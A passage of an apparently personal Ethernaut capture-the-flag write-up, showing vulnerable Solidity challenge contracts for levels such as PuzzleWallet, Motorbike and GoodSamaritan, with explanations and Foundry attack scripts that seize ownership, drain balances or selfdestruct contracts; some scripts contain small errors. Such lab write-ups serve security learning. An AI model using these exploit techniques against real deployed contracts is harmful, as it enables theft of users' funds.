                                    accomplishments against evil miners.
                                </li>
                                <li>
                                    You'll need to hijack this wallet to become the admin of the proxy.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                The proxy contract usually does not have much code inside of it and have a
                                <b>fallback</b>
                                function that will "forward" all the user's interaction to the Implementation contract
                                that contains the real implementation of the function. This "forwarding" operation is
                                done via <b>delegatecall</b>.
                            </li>
                            <li>
                                When ContractA calls ContractB's function <b>implementation()</b> via
                                <b>delegatecall</b> the function
                                is executed on ContractB code but the whole context (msg.sender, msg.value and
                                contract's storage) is the one from ContractA.
                            </li>
                            <li>
                                A critical concept to remember is that if ContractB code update the contract's storage
                                during a <b>delegatecall</b> it will not modify ContractB storage but ContractA storage!
                            </li>
                            <li>
                                In order to execute any transaction we have to become a <b>whitelist</b> member.
                            </li>
                            <li>
                                We can observe that the PuzzleProxy and PuzzleWallet <b>not have</b> same storage
                                layout.
                            </li>
                            <li>
                                Using this we can register our address as pending admin by calling
                                <b>proposeNewAdmin()</b>.
                            </li>
                            <li>
                                When <b>PuzzleWallet</b> functions are executed via <b>delegatecall</b> from PuzzleProxy
                                the
                                <b>pendingAdmin</b> is now the <b>owner</b>!
                            </li>
                            <li>
                                On <b>Slot 1</b> of the PuzzleWallet contract, there is the maxBalance variable. We just
                                need
                                to update that value by casting the Player address to an integer via
                                <b>uint256(player)</b>.
                            </li>
                            <li>
                                The only function that modify that variable is <b>setMaxBalance()</b> that can be called
                                only by
                                a <b>whitelisted</b> user and when the balance of the contract is 0.
                            </li>
                            <li>
                                We are now the owner of the contract, so we can add ourselves to
                                the whitelisted list by calling <b>addToWhitelist()</b>
                            </li>
                            <li>
                                If you look at the <b>setMaxBalance()</b>, the transaction will <b>revert</b> if there
                                are any
                                balances inside the contract and the contract was funded with <b>0.001 ether</b> at
                                deployment
                                side by the deployer.
                            </li>
                            <li>
                                To finish the challenge and become the admin of the Proxy, we must drain the contract by
                                calling execute and making it use that 0.001 ether balance.
                            </li>
                            <li>
                                We can’t rely on deposit because even if we deposit something and then call execute we
                                couldn't use more than what we have deposited
                            </li>
                            <li>
                                <b>Multicall</b> allows the user to batch together multiple calls to spare some gas and
                                as you
                                can see has a check to allow only one deposit inside the batched calls.
                            </li>
                            <li>
                                We cant call d<b>eposit()</b> twice in a single call by passing calldata as
                                <b>[signature of
                                    deposit + signature of deposit]</b>. As there is a check to catch this case.
                            </li>
                            <li>
                                But we can send the singature of the <b>deposit()</b> and a call to <b>multicall()</b>
                                again with the
                                <b>deposit() signature</b>.
                            </li>
                            <li>
                                After the execute we have successfully removed all the ether balance from the contract
                                (and gained 0.001 free ether) and we can call
                                <b>puzzleWallet.setMaxBalance( uint256(player))</b>;
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">PuzzleWalletSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";

contract PuzzleWalletSolve is Script {
    PuzzleWallet public wallet = PuzzleWallet(0x94A2389802b644E387eF2aEE4090491B3484D08C);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Initial wallet owner  :", wallet.owner());

        new Attack(wallet);

        console.log("After wallet owner  :", wallet.owner());
        vm.stopBroadcast();
    }
}

contract Attack {
    constructor(PuzzleWallet wallet) payable {
        // overwrite wallet owner
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        // deposit
        data[0] = deposit_data[0];
        // multicall -> deposit
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
        wallet.multicall{value: 0.001 ether}(data);

        // withdraw
        wallet.execute(msg.sender, 0.002 ether, "");

        // set admin
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(wallet.admin() == msg.sender, "Attack failed");
        selfdestruct(payable(msg.sender));
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/PuzzleWalletSolve.s.sol:PuzzleWalletSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 25-Motorbike -->
                <div>
                    <h4>25-Motorbike</h4>
                    <span id="levelBox">Motorbike.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    Would you be able to selfdestruct its engine and make the motorbike unusable ?
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                Create the new implementation contract with <b>self destruct</b> functionality.
                            </li>
                            <li>
                                Call the <b>initialize()</b> function on the implementation contract directly.
                            </li>
                            <li>
                                By calling intialize() we will become the <b>updrader</b> of the Engine contract.
                            </li>
                            <li>
                                Now, we can update the implementation addres by calling <b>upgradeToAndCall()</b>
                                function and pass the data as the signature of the <b>kill()</b> function to be called
                                by the <b>Engine</b> contract.
                            </li>
                            <li>
                                This will destruct the Engine contract, because the call was done using delegatecall so
                                the storage of the Engine will be affected.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">MotorbikeSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Motorbike, Engine} from "../src/Motorbike.sol";

contract MotorbikeSolve is Script {
    Engine public engine = Engine(0xa67972265516E4BFEA3d4f9c70749768be2d29F8);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Attack().attack(engine);

        vm.stopBroadcast();
    }
}

contract Attack {
    function attack(Engine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(this)));
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/MotorbikeSolve.s.sol:MotorbikeSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 26-DoubleEntryPoint -->
                <div>
                    <h4>26-DoubleEntryPoint</h4>
                    <span id="levelBox">DoubleEntryPoint.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
    mapping(address => IDetectionBot) public usersDetectionBots;
    mapping(address => uint256) public botRaisedAlerts;

    function setDetectionBot(address detectionBotAddress) external override {
        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
    }

    function notify(address user, bytes calldata msgData) external override {
        if (address(usersDetectionBots[user]) == address(0)) return;
        try usersDetectionBots[user].handleTransaction(user, msgData) {
            return;
        } catch {}
    }

    function raiseAlert(address user) external override {
        if (address(usersDetectionBots[user]) != msg.sender) return;
        botRaisedAlerts[msg.sender] += 1;
    }
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if (forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(address to, uint256 value, address origSender)
        public
        override
        onlyDelegateFrom
        fortaNotify
        returns (bool)
    {
        _transfer(origSender, to, value);
        return true;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    This level features a CryptoVault with special functionality, the sweepToken
                                    function. This is a common function used to retrieve tokens stuck in a contract. The
                                    CryptoVault operates with an underlying token that can't be swept, as it is an
                                    important core logic component of the CryptoVault. Any other tokens can be swept.
                                </li>
                                <li>
                                    The underlying token is an instance of the DET token implemented in the
                                    DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it.
                                    Additionally the CryptoVault also holds 100 of LegacyToken LGT.
                                </li>
                                <li>
                                    In this level you should figure out where the bug is in CryptoVault and protect it
                                    from being drained out of tokens.
                                </li>
                                <li>
                                    The contract features a Forta contract where any user can register its own detection
                                    bot contract. Forta is a decentralized, community-based monitoring network to detect
                                    threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as
                                    quickly as possible.
                                </li>
                                <li>Your job is to implement a detection bot and register it in the Forta contract. The
                                    bot's implementation will need to raise correct alerts to prevent potential attacks
                                    or bug exploits.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                <b>CryptoVault</b> is constructed with a recipient address argument.
                            </li>
                            <li>
                                A setUnderlying function sets a token address as the <b>underlying token</b>. This is a
                                one
                                time operation, as per the require line in it checking for the initial value of
                                underlying.
                            </li>
                            <li>
                                A <b>sweepToken()</b> function takes a token address as parameter, and transfers the
                                balance of
                                CryptoVault to the <b>recipient</b>. <b>Sweeping</b> here is to transfer the entire
                                balance of
                                <b>CryptoVault</b> about any token other than the underlying token to the recipient.
                                This is
                                commonly done so that the user can get mistakenly sent tokens.
                            </li>
                            <li>
                                Now, we will prevent this attack with a <b>Forta detection bot</b>. We must look at the
                                Forta
                                contract for this.
                            </li>
                            <li>
                                In particular, our bot must follow the <b>IDetectionBot</b> interface, which requests
                                the
                                implementation of a function <b>handleTransaction(address user, bytes calldata
                                    msgData)</b>
                                external. Indeed, this function is called within the <b>notify()</b> function of
                                <b>Forta</b> contract.
                                To raise an alert, the bot must call <b>raiseAlert()</b> function of it's caller
                                (accessed via
                                msg.sender) which will be the <b>Forta</b> contract.
                            </li>
                            <li>
                                The attack was made by calling the <b>sweepToken()</b> function of <b>CryptoVault</b>
                                contract with
                                <b>LegacyToken</b> contract as the address. Then, a <b>message</b> call to
                                <b>DoubleEntryPoint</b> contract
                                is made for the <b>delegateTransfer()</b> function. That message's data is the one our
                                bot will
                                receive on <b>handleTransaction()</b>, because delegateTransfer is the one with
                                <b>fortaNotify
                                    modifier</b>. Regarding that function, the only thing we can use for our need is the
                                <b>origSender</b>, which will be the address of CryptoVault during a <b>sweep</b>. So,
                                our bot can
                                check that value within the calldata and <b>raise an alert</b> if it is the address of
                                <b>CryptoVault</b>.
                            </li>
                            <li>
                                At this point, we need to put special effort into understanding how the calldata will be
                                structured. We are calling delegateTransfer but that is not the calldata our bot will
                                receive. You see, this function has a modifier fortaNotify. The modifier is not a
                                message call, but simply replaces code with respect to the execution line (_;). During
                                notify, the <b>msg.data</b> is passed as a parameter.
                            </li>
                            <li>
                                After notify, our detection bot's <b>handleTransaction()</b> is called with the same
                                msg.data
                                passed to notify. So, during handleTransaction, the calldata will have the actual
                                calldata to call that function, and the delegateCall calldata as an argument.
                            </li>
                            <div class="repo">
                                <pre>
position	bytes	type	      value
 0x00	     4	   bytes4	 Function selector of handleTransaction which is 0x220ab6aa
 0x04	     32	   address 	 user parameter
 0x24	     32	   uint256	 offset of msgData parameter, 0x40 in this case
 0x44	     32	   uint256	 length of msgData parameter, 0x64 in this case
 0x64 *	     4	   bytes4	 Function selector of delegateTransfer which is 0x9cd1a121
 0x68 *	     32	   address 	 to parameter
 0x88 *	     32	   uint256	 value parameter
 0xA8 *	     32	   address 	 origSender parameter the one we want
 0xC8	     28	   padding	 zero-padding as per the 32-byte arguments rule of bytes
                                </pre>
                            </div>
                            <li>
                                The <b>*</b> marks the original calldata when <b>delegateTransfer()</b> is called.
                            </li>
                            <li>
                                Looking at the calldata of delegateTransfer, we have:
                                <ul>
                                    <li>4 bytes function selector</li>
                                    <li>32 bytes address</li>
                                    <li>32 bytes unsigned integer</li>
                                    <li>32 bytes address</li>
                                </ul>
                            </li>
                            <li>
                                A total of <b>100 bytes</b>, which is <b>0x64</b> in hex. So, in the calldata of
                                handleTransaction the
                                length value for msgData will be 0x64.
                            </li>
                            <li>
                                We need to extract <b>origSender</b> from the <b> msg.data</b> inside
                                <b>handleTransaction()</b> function
                                implemented in our bot contract.
                            </li>
                            <li>
                                The <b>origSender</b> is from the <b>0xA8</b> byte of the msg.data inside
                                <b>handleTransaction()</b>
                                function.
                            </li>
                            <li>
                                We can use <b>calldataload</b> opcode to access the <b>origSender</b>. And <b>if the
                                    origSender is equals
                                    to CryptoVault then raise an alert</b>.
                            </li>
                            <li>
                                Now our bot is ready, we have to deploy it and register the bot at Forta contract.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">DoubleEntryPointSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {DoubleEntryPoint} from "../src/DoubleEntryPoint.sol";

contract DoubleEntryPointSolve is Script {
    DoubleEntryPoint public det = DoubleEntryPoint(0x91a71dbbEDC98B0B70e34A3CCf3D472DC8448DE3);

    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address cryptovault = det.cryptoVault();
        address player = det.player();
        address delegatedFrom = det.delegatedFrom(); // Legacy Token Address

        console.log("CryptoVault : ", cryptovault);
        console.log("Player : ", player);
        console.log("LGT : ", delegatedFrom);

        LegacyToken lgt = LegacyToken(delegatedFrom);
        CryptoVault cv = CryptoVault(cryptovault);

        console.log("CryptoVault balance of DET : ", det.balanceOf(cryptovault));
        console.log("CryptoVault balance of LGT : ", lgt.balanceOf(cryptovault));

        console.log("Delegate of LGT : ", address(lgt.delegate()));
        console.log("DET : ", address(det));
        console.log("Both are same");

        Forta forta = det.forta();

        console.log("registering bot.........");

        DetectionBot bot = new DetectionBot();

        forta.setDetectionBot(address(bot));

        console.log("BOT ALERTS Before exploit : ",forta.botRaisedAlerts(address(bot)));

        console.log("Exploiting DET...........");

        // new Attack().exploit();  // reverts because bot detects the exploit

        console.log("CryptoVault balance of DET : ", det.balanceOf(cryptovault));

        console.log("BOT ALERTS After exploit : ",forta.botRaisedAlerts(address(bot)));

        vm.stopBroadcast();
    }
}

contract Attack{
    DoubleEntryPoint public det = DoubleEntryPoint(0x91a71dbbEDC98B0B70e34A3CCf3D472DC8448DE3);
    address public  cryptovault = det.cryptoVault();
    address public player = det.player();
    address public delegatedFrom = det.delegatedFrom(); // Legacy Token Address

    function exploit() public{
        CryptoVault cv = CryptoVault(cryptovault);
        cv.sweepToken(IERC20(delegatedFrom));
    }

}

contract DetectionBot{

    DoubleEntryPoint public det = DoubleEntryPoint(0x91a71dbbEDC98B0B70e34A3CCf3D472DC8448DE3);
    address public  cryptovault = det.cryptoVault();

    function handleTransaction(address user, bytes calldata msgData) external {
        address origSender;

        assembly {
            origSender := calldataload(0xa8)
        }

        if (origSender ==cryptovault ){
            Forta(msg.sender).raiseAlert(user); // raise alert of Forta contract
        }
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/DoubleEntryPointSolve.s.sol:DoubleEntryPointSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 27-GoodSamaritan -->
                <div>
                    <h4>27-GoodSamaritan</h4>
                    <span id="levelBox">GoodSamaritan.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    This instance represents a Good Samaritan that is wealthy and ready to donate some
                                    coins to anyone requesting it.
                                </li>
                                <li>
                                    Would you be able to drain all the balance from his Wallet?
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                Contract has tons of coins and is willing to donate them, <b>only 10</b> at a time
                                though. To deplete all 1 million coins of the contract it takes more transactions and
                                gas, we would have to take more than 10 at a time.
                            </li>
                            <li>
                                Under <b>requestDonation()</b> function at the comment that says: send the coins left.
                                Looking at this function, it is a try-catch clause that handles an exception thrown
                                during <b>wallet.donate10(msg.sender)</b>. Specifically, if the exception is due to
                                error <b>NotEnoughBalance()</b>; then it will send all the remaining coins.
                            </li>
                            <Li>
                                Under <b>coin.transfer()</b>, if the transfer happens and it is to a contract account,
                                then <b>notify(uint256 amount)</b> function is called there to basically let that
                                contract know about this transfer.
                            </Li>
                            <li>
                                we are supposed to throw <b>NotEnoughBalance();</b> during the <b>transfer</b>, and we
                                may very well do that within our <b>notify handler</b>. There is a catch though: if you
                                simply do that it will also revert the <b>transferRemainder</b> call too. So we can just
                                check if the amount is 10, and revert in that case only.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">GoodSamaritanSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {GoodSamaritan, Coin} from "../src/GoodSamaritan.sol";

contract GoodSamaritanSolve is Script {
    GoodSamaritan public goodSamaritan = GoodSamaritan(0xc221a88095591Bd0239B40348a530D286e919b06);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Before balance of Wallet", goodSamaritan.coin().balances(address(goodSamaritan.wallet())));

        new Attack(goodSamaritan).attack(engine);

        console.log("After balance of Wallet", goodSamaritan.coin().balances(address(goodSamaritan.wallet())));
        vm.stopBroadcast();
    }
}

contract Attack {
    GoodSamaritan private immutable target;
    Coin private immutable coin;

    error NotEnoughBalance();

    constructor(GoodSamaritan _target) {
        target = _target;
        coin = Coin(_target.coin());
    }

    function attack() external {
        target.requestDonation();
        require(coin.balances(address(this)) == 10 ** 6, "hack failed");
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/GoodSamaritanSolve.s.sol:GoodSamaritanSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 28-GatekeeperThree -->
                <div>
                    <h4>28-GatekeeperThree</h4>
                    <span id="levelBox">GatekeeperThree.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    Cope with gates and become an entrant.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                Similar to GatekeeperOne and GatekeeperTwo we need to pass the three gate checks by the
                                modifiers when calling the <b>enter()</b> function.
                            </li>
                            <li>
                                <b>gateOne()</b> can be bypassed if we are the owner of the contract and we need call
                                from a
                                contract.
                            </li>
                            <li>
                                To be be the owner we can call the <b>construct0r()</b> function its not the actual
                                <b>constructor()</b>, so we can be the owner after calling it.
                            </li>
                            <li>
                                <b>gateTwo()</b> will be passed if we managed to change the allowEntrance value to true.
                                To do
                                it, we need to call the <b>getAllowance()</b> function with the right <b>password</b>
                                defined inside
                                SimpleTrick contract.
                            </li>
                            <li>
                                So, we need to deploy a SimpleTrick contract first, we can do this by calling
                                <b>createTrick()</b> function.
                            </li>
                            <li>
                                After that we need to find the password stored inside SimpleTrick contract. We can do
                                this by using <b>vm.load</b> cheatcode or we can find the password inside our Attack
                                contract.
                            </li>
                            <li>
                                Because the password is the <b>block.timestamp</b> which will be same during a
                                <b>transaction</b>. If
                                we deploy the SimpeToken and get the block.timestamp inside same call, the
                                <b>block.timestamp</b> will be the <b>password</b> for us.
                            </li>
                            <li>
                                Calling <b>getAllowance()</b> with this value will pass the gateTwo.
                            </li>
                            <li>
                                For <b>gateThree()</b> the balance of the GatekeeperThree should be greater than 0.001
                                ether
                                and when the GatekeeperThree sends 0.001 ether to owner it should return false.
                            </li>
                            <li>
                                Remember owner is out attack contract, GatekeeperThree sending ether using send call.
                                send call will return <b>false</b> when the transaction <b>fails</b>.
                            </li>
                            <li>
                                So, we have to deny the ether sent by the <b>GatekeeperThree</b>. To do this, I
                                <b>haven’t
                                    implemented any fallback or receive function inside my Attack contract</b>.
                            </li>
                            <li>
                                For this reason the send will return false to GatekeeperThree contract and now we will
                                able to register as entrant.
                            </li>
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">GatekeeperThreeSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {GatekeeperThree} from "../src/GatekeeperThree.sol";

contract GoodSamaritanSolve is Script {
    GatekeeperThree public gate = GatekeeperThree(0x44fdd3c58983278570DdE58eea4BB3427EC86DC1);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Gate Owner : ", gate.owner());

        Attack attack = new Attack{value: 0.002 ether}();
        attack.exploit(gate);
        
        console.log("Allow Entrance : ", gate.allowEntrance());
        console.log("Gate Owner : ", gate.owner());
        console.log("Entrant : ", gate.entrant());

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor() payable{}

    function exploit(GatekeeperThree gate) public {
        gate.construct0r();

        gate.createTrick();
        gate.getAllowance(block.timestamp);

        (bool success, ) = payable(address(gate)).call{value : address(this).balance}("");
        require(success, "Tx Failed");

        gate.enter();
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/GatekeeperThreeSolve.s.sol:GatekeeperThreeSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 29-Switch -->
                <div>
                    <h4>29-Switch</h4>
                    <span id="levelBox">Switch.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
